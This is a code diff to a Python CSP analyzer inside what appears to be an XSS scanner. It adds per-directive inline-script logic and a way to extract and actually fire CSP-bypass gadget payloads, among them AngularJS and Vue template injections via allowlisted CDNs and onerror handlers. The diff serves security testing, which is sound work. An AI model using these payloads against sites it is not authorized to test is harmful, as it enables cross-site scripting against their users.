@@ -34,31 +34,31 @@ SCRIPT_GADGETS: list[tuple[str, str, str]] = [
     (r'ajax\.googleapis\.com',
      "Angular JS via googleapis CDN",
      "<script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js></script>"
-     "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>"),
+     "<div ng-app ng-csp>{{constructor.constructor(\"alert(1)\")()}}</div>"),
     (r'cdn\.jsdelivr\.net',
      "Angular JS via jsdelivr CDN",
      "<script src=https://cdn.jsdelivr.net/npm/angular@1.7.9/angular.min.js></script>"
-     "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>"),
+     "<div ng-app ng-csp>{{constructor.constructor(\"alert(1)\")()}}</div>"),
     (r'cdnjs\.cloudflare\.com',
      "Angular JS via cloudflare CDN",
      "<script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.min.js></script>"
-     "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>"),
+     "<div ng-app ng-csp>{{constructor.constructor(\"alert(1)\")()}}</div>"),
     (r'unpkg\.com',
      "Angular JS via unpkg CDN",
      "<script src=https://unpkg.com/angular@1.8.0/angular.min.js></script>"
-     "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>"),
+     "<div ng-app ng-csp>{{constructor.constructor(\"alert(1)\")()}}</div>"),
     (r'cdn\.bootcdn\.net',
      "Angular JS via BootCDN",
      "<script src=https://cdn.bootcdn.net/ajax/libs/angular.js/1.8.0/angular.min.js></script>"
-     "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>"),
+     "<div ng-app ng-csp>{{constructor.constructor(\"alert(1)\")()}}</div>"),
     (r'cdn\.jsdelivr\.net/npm/vue',
      "Vue.js template injection via jsdelivr",
      "<script src=https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.min.js></script>"
-     "<div id=x>{{_c.constructor('alert(1)')()}}</div>"),
+     "<div id=x>{{_c.constructor(\"alert(1)\")()}}</div>"),
     (r'cdnjs\.cloudflare\.com/ajax/libs/vue',
      "Vue.js template injection via cloudflare",
      "<script src=https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.14/vue.min.js></script>"
-     "<div id=x>{{$root.constructor.constructor('alert(1)')()}}</div>"),
+     "<div id=x>{{$root.constructor.constructor(\"alert(1)\")()}}</div>"),
     # --- Prototype.js -----------------------------------------------------
     (r'ajax\.googleapis\.com/ajax/libs/prototype',
      "Prototype.js String#evalJSON / periodicalExecuter",
@@ -165,7 +165,7 @@ SCRIPT_GADGETS: list[tuple[str, str, str]] = [
     (r'code\.angularjs\.org',
      "Angular via code.angularjs.org",
      "<script src=https://code.angularjs.org/1.8.0/angular.min.js></script>"
-     "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>"),
+     "<div ng-app ng-csp>{{constructor.constructor(\"alert(1)\")()}}</div>"),
     # --- CDN-hosted polyfills (can be abused as eval sinks) --------------
     (r'cdn\.polyfill\.io',
      "polyfill.io script injection (deprecated CDN)",
@@ -204,6 +204,76 @@ def parse_csp(header: str) -> dict:
     return out
 
 
+# ---------------------------------------------------------------------------
+# CSP3 delivery families: which directive actually governs a payload
+# ---------------------------------------------------------------------------
+# ``script-src-elem`` and ``script-src-attr`` do not *add* to ``script-src``
+# -- they REPLACE it for their own delivery type, and when present the older
+# directive is not consulted at all for that type.  A policy may therefore
+# allow event-handler attributes while blocking <script> elements, or the
+# other way round, and reading only ``script-src`` gets both directions wrong:
+#
+#   script-src 'self'; script-src-attr 'unsafe-inline'
+#       -> on* reflection executes; <script> does not.
+#   script-src 'nonce-abc' 'unsafe-inline'; script-src-attr 'unsafe-inline'
+#       -> the nonce inert-izes 'unsafe-inline' for elements only; handlers
+#          are governed by a list that carries no nonce at all.
+SCRIPT_FAMILIES = {
+    "elem": ("script-src-elem", "script-src", "default-src"),
+    "attr": ("script-src-attr", "script-src", "default-src"),
+    # javascript: URIs are CSP's "inline script" for URLs; no -uri directive
+    # exists, so script-src governs them.
+    "uri": ("script-src", "default-src"),
+}
+
+_NONCE_OR_HASH_RE = re.compile(
+    r"'(?:nonce-[^']+|sha(?:256|384|512)-[^']+)'", re.I)
+
+
+def governing_directive(directives: dict, family: str = "elem") -> str:
+    """Name of the directive that decides this family, or "" when none does."""
+    for name in SCRIPT_FAMILIES[family]:
+        if directives.get(name):
+            return name
+    return ""
+
+
+def family_sources(directives: dict, family: str = "elem") -> list:
+    """Source list of the governing directive for one delivery family."""
+    return list(directives.get(governing_directive(directives, family)) or [])
+
+
+def family_allows_inline(directives: dict, family: str = "elem") -> bool:
+    """Whether inline script of one delivery family still executes.
+
+    An unrestricted policy (no script-src / default-src at all) allows it.
+    Per CSP Level 2+ a nonce or hash source in the governing list makes
+    ``'unsafe-inline'`` INERT -- and the rule is per list, which is exactly
+    why the family matters: a nonce sitting in ``script-src`` does not
+    inert-ize a ``script-src-attr`` that carries only ``'unsafe-inline'``.
+    """
+    src = family_sources(directives, family)
+    if not src:
+        return True
+    joined = " ".join(src)
+    if "'unsafe-inline'" not in joined:
+        return False
+    return not _NONCE_OR_HASH_RE.search(joined)
+
+
+def inline_blocked(csp_header: str, family: str = "elem") -> bool:
+    """Whether a CSP header stops inline script of one delivery family.
+
+    ``'unsafe-eval'`` is deliberately not an escape here: it opens ``eval()``,
+    not an reflected ``<script>`` tag, and conflating the two was how a policy
+    of ``script-src 'unsafe-eval'`` used to read as "inline works".
+    """
+    directives = parse_csp(csp_header or "")
+    if not directives:
+        return False
+    return not family_allows_inline(directives, family)
+
+
 def analyze(csp_header: str) -> CSPReport:
     """Full CSP analysis.  Returns a CSPReport."""
     rep = CSPReport(header=csp_header or "")
@@ -212,21 +282,45 @@ def analyze(csp_header: str) -> CSPReport:
         rep.weak.append("no CSP header")
         return rep
 
-    script_src = rep.directives.get("script-src") or rep.directives.get("default-src") or []
+    elem_src = family_sources(rep.directives, "elem")
+    attr_src = family_sources(rep.directives, "attr")
+    # Host allowlists are consulted for every script delivery type, so the
+    # gadget / wildcard sweep reads the union of the governing lists --
+    # ``script-src-elem https://cdn.example.com`` is a gadget route even
+    # though ``script-src`` itself is absent.
+    script_src = list(dict.fromkeys(
+        list(elem_src) + list(attr_src) + list(family_sources(rep.directives, "uri"))))
     object_src = rep.directives.get("object-src") or rep.directives.get("default-src") or []
     base_uri = rep.directives.get("base-uri") or []
-    frame_src = (rep.directives.get("frame-src")
-                 or rep.directives.get("child-src")
-                 or rep.directives.get("default-src") or [])
 
-    # Check for dangerous keywords
-    if "'unsafe-inline'" in script_src:
-        rep.weak.append("script-src 'unsafe-inline' -> inline scripts run")
+    # Check for dangerous keywords.  Inline is a PER-FAMILY answer (see
+    # SCRIPT_FAMILIES): "which payload runs" and "does anything run" are
+    # different questions when the policy splits elem from attr.
+    elem_inline = family_allows_inline(rep.directives, "elem")
+    attr_inline = family_allows_inline(rep.directives, "attr")
+    if elem_inline or attr_inline:
+        if elem_inline:
+            inline_payload = "<script>alert(1)</script>"
+            if family_sources(rep.directives, "elem"):
+                inline_reason = ("'unsafe-inline' allows any inline <script>")
+                rep.weak.append(
+                    f"{governing_directive(rep.directives, 'elem')} "
+                    "'unsafe-inline' -> inline scripts run")
+            else:
+                inline_reason = ("no script-src / default-src restriction in "
+                                 "this policy -> inline scripts run")
+                rep.weak.append("CSP restricts no scripts -> inline scripts run")
+        else:
+            inline_payload = "<img src=x onerror=alert(1)>"
+            inline_reason = ("'unsafe-inline' allows event-handler attributes")
+            rep.weak.append(
+                f"{governing_directive(rep.directives, 'attr')} "
+                "'unsafe-inline' -> on* handlers run; <script> elements do not")
         rep.bypassable = True
         rep.bypasses.append({
             "type": "inline",
-            "payload": "<script>alert(1)</script>",
-            "reason": "'unsafe-inline' allows any inline <script>",
+            "payload": inline_payload,
+            "reason": inline_reason,
         })
     if "'unsafe-eval'" in script_src:
         rep.weak.append("script-src 'unsafe-eval' -> eval/Function run")
@@ -251,22 +345,43 @@ def analyze(csp_header: str) -> CSPReport:
                     "gadget": gadget,
                     "payload": payload,
                 })
+        # Phase 187: registered gadgets (register_gadget) participate in the
+        # WHOLE pipeline, not just payload extraction -- the relevance gate
+        # and is_strict_inline both read analyze(), so a lab/CDN gadget that
+        # only lived in gadget_bypass_payloads would never be attempted.
+        for g in _EXTRA_GADGETS:
+            try:
+                if re.search(g["pattern"], source, re.IGNORECASE):
+                    rep.weak.append(
+                        f"script-src whitelists {source} -> {g['desc']}")
+                    rep.bypassable = True
+                    rep.bypasses.append({
+                        "type": "script_gadget",
+                        "host": source,
+                        "gadget": g["desc"],
+                        "payload": g["template"].replace("__SRC__", source),
+                    })
+            except re.error:
+                continue
 
     # Check for 'strict-dynamic' (good defense)
     if "'strict-dynamic'" in script_src:
         rep.weak.append("uses 'strict-dynamic' (good; nonces/whitelist less relevant)")
 
     # Check for nonce/hash with 'unsafe-inline' (nonce/hash makes
-    # 'unsafe-inline' ignored by modern browsers -- a common safe pattern)
+    # 'unsafe-inline' ignored by modern browsers -- a common safe pattern).
+    # Informational only now: family_allows_inline() already applied that
+    # inertness per family, so no inert inline bypass was added above, and a
+    # ``script-src-attr 'unsafe-inline'`` list carrying no nonce keeps its
+    # event-handler bypass.
     has_nonce = any(s.startswith("'nonce-") for s in script_src)
     has_hash = any(s.startswith("'sha") for s in script_src)
     if (has_nonce or has_hash) and "'unsafe-inline'" in script_src:
-        # Modern browsers ignore 'unsafe-inline' when nonce/hash present.
-        # Remove the inline bypass we added (it would not work).
-        rep.bypasses = [b for b in rep.bypasses if b["type"] != "inline"]
-        if not rep.bypasses:
-            rep.bypassable = False
         rep.weak.append("nonce/hash present; 'unsafe-inline' ignored by modern browsers")
+    if "'unsafe-hashes'" in script_src:
+        rep.weak.append(
+            "'unsafe-hashes' present -> a listed hash can authorize an "
+            "on* attribute, which bare 'unsafe-inline' would not")
 
     # -- Phase 20: additional advanced checks -----------------------------
 
@@ -354,11 +469,87 @@ def is_bypassable(csp_header: str) -> bool:
     return analyze(csp_header).bypassable
 
 
-_NONCE_OR_HASH_RE = re.compile(
-    r"'(?:nonce-[^']+|sha(?:256|384|512)-[^']+)'", re.I)
+# ---------------------------------------------------------------------------
+# Phase 187: executable gadget chains (absorbed from the nuclei csp-bypass
+# template family / renniepak CSPBypass corpus).
+#
+# The SCRIPT_GADGETS table above has always KNOWN these bypasses; ``analyze``
+# reports them as static suggestions ("It does NOT execute the bypasses" --
+# its own docstring).  The competitors' measurement culture went one step
+# further: inject the gadget payload and watch a real browser for the dialog.
+# This module now supports that: ``gadget_bypass_payloads`` extracts
+# token-stampable payloads for the allowlisted hosts, and the scanners run
+# them through the normal reflection + headless-confirmation machinery.
+# ---------------------------------------------------------------------------
+_EXTRA_GADGETS: list[dict] = []
 
 
-def unsafe_inline_overridden(csp_header: str) -> bool:
+def register_gadget(pattern: str, template: str, desc: str = "") -> None:
+    """Register an additional script gadget (lab targets, tests, new CDNs).
+
+    ``pattern`` is a regex matched against each script-src source; when it
+    matches, ``template`` (a full HTML payload, conventionally calling
+    ``alert(1)`` so ``verifier.mark`` can stamp the probe token) becomes an
+    executable candidate.  ``__SRC__`` inside the template is replaced with
+    the matched source (so ``<script src="__SRC__/jsonp?cb=alert(1)">`` rides
+    whatever host the policy actually allowlists).  Registered gadgets are
+    additive: the static table is untouched and an empty registry behaves
+    exactly like before.
+    """
+    _EXTRA_GADGETS.append({"pattern": pattern, "template": template,
+                           "desc": desc or "registered gadget"})
+
+
+def gadget_bypass_payloads(csp_header: str) -> list[dict]:
+    """Executable gadget payloads for the script sources this CSP allowlists.
+
+    Returns ``[{"payload", "gadget", "host"}]`` -- deduped, static-table
+    matches first, registered gadgets second.  Payloads are raw (token
+    UNSTAMPED); the caller stamps them with ``verifier.mark`` so a dialog can
+    be attributed.  ``wildcard`` bypasses are deliberately excluded: their
+    payload points at a host the attacker must control first, so there is
+    nothing WE can execute to measure them.
+    """
+    if not csp_header:
+        return []
+    rep = analyze(csp_header)
+    out: list[dict] = []
+    seen: set[str] = set()
+
+    def _add(payload: str, gadget: str, host: str) -> None:
+        if payload and payload not in seen:
+            seen.add(payload)
+            out.append({"payload": payload, "gadget": gadget, "host": host})
+
+    for b in rep.bypasses:
+        if b.get("type") == "script_gadget":
+            _add(b.get("payload", ""), b.get("gadget", ""), b.get("host", ""))
+    return out
+
+
+def gadget_chain_relevant(csp_header: str) -> bool:
+    """True when a whitelisted gadget is the ONLY script route left.
+
+    Relevant means: the analyzer found a ``script_gadget`` bypass AND inline
+    execution is unavailable for EVERY delivery family (no ``'unsafe-inline'``;
+    a nonce/hash source makes it inert per CSP Level 2+).  With inline
+    available the ordinary payload queue already works and a gadget attempt
+    would be a redundant request.  ('unsafe-eval' does NOT make gadgets
+    redundant -- eval-based sinks still need an injection point of their own.)
+    """
+    if not csp_header:
+        return False
+    try:
+        rep = analyze(csp_header)
+    except Exception:
+        return False
+    if not any(b.get("type") == "script_gadget" for b in rep.bypasses):
+        return False
+    return not any(family_allows_inline(rep.directives, family)
+                   for family in SCRIPT_FAMILIES)
+
+
+def unsafe_inline_overridden(csp_header: str, family: str = "elem") -> bool:
     """Phase 98: a nonce/hash source makes ``'unsafe-inline'`` INERT.
 
     Real-world CSP headers almost always carry BOTH: a nonce (or hash)
@@ -372,6 +563,12 @@ def unsafe_inline_overridden(csp_header: str) -> bool:
     produced systematic FALSE POSITIVES on exactly those targets: a
     high/high reflected finding whose PoC never fires.
 
+    Phase 189 made it per family, because the same rule produced the
+    opposite error: a nonce in ``script-src`` does NOT inert-ize a
+    ``script-src-attr`` list that carries only ``'unsafe-inline'``, so
+    answering for ``<script>`` and for ``on*`` from one list turned a
+    working event-handler injection into a refutation.
+
     This is about INLINE execution only -- ``'strict-dynamic'`` (which
     invalidates host sources, not inline sources) is deliberately not
     considered here.
@@ -379,33 +576,32 @@ def unsafe_inline_overridden(csp_header: str) -> bool:
     rep = analyze(csp_header or "")
     if not rep.directives:
         return False
-    src = (rep.directives.get("script-src")
-           or rep.directives.get("default-src") or [])
+    src = family_sources(rep.directives, family)
+    if "'unsafe-inline'" not in " ".join(src):
+        return False
     return bool(_NONCE_OR_HASH_RE.search(" ".join(src)))
 
 
 def is_strict_inline(csp_header: str) -> bool:
     """Phase 35: True when inline reflection payloads are FUTILE.
 
-    Strict means: a script-src/default-src restriction exists, inline
-    scripts are NOT re-allowed (no 'unsafe-inline'/'unsafe-eval'), and the
+    Strict means: a script restriction exists, inline is NOT re-allowed for
+    any delivery family ('unsafe-inline' inert-ized or absent), and the
     analyzer found no bypass path.  Nonce policies are conservatively NOT
     considered strict (a leaked/reflected nonce re-enables inline tags and
     the dedicated nonce-reuse layer handles that case).
     """
     rep = analyze(csp_header or "")
     if not rep.directives or rep.bypassable:
+        return False          # inline / eval / gadget / wildcard route works
+    if not (family_sources(rep.directives, "elem")
+            or family_sources(rep.directives, "attr")):
+        return False          # nothing restricts scripts -- not "strict"
+    if any(v.startswith("'nonce-")
+           for v in family_sources(rep.directives, "elem")):
         return False
-    src = (rep.directives.get("script-src")
-           or rep.directives.get("default-src") or [])
-    if not src:
-        return False
-    joined = " ".join(src)
-    if "'unsafe-inline'" in joined or "'unsafe-eval'" in joined:
-        return False
-    if any(v.startswith("'nonce-") for v in src):
-        return False
-    return True
+    return not any(family_allows_inline(rep.directives, family)
+                   for family in SCRIPT_FAMILIES)
 
 
 def best_bypass(csp_header: str) -> dict | None:
@@ -459,7 +655,7 @@ def best_bypass(csp_header: str) -> dict | None:
 # scanner calls it once per endpoint and aggregates the results across
 # requests to detect cross-response reuse.
 
-import re as _re_module
+import re as _re_module  # noqa: E402
 
 # Matches ``nonce="<value>"`` or ``nonce='<value>'`` or ``nonce=<value>`` in
 # both the CSP header and the HTML body.
